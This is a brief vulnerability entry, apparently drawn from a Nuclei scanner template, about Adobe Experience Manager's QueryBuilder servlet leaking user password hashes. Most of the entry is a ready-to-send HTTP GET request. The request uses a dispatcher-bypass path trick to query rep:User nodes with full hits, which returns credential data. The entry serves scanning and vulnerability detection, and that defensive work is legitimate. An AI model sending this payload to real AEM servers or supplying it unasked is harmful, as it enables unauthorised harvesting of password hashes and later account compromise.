# Vulnerability: Query hashed password via QueryBuilder Servlet
**Classification:** AEM
**Source:** Nuclei Template (`aem-hash-querybuilder.yaml`)

## Description
AEM hased password can be queried via QueryBuilder Servlet.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

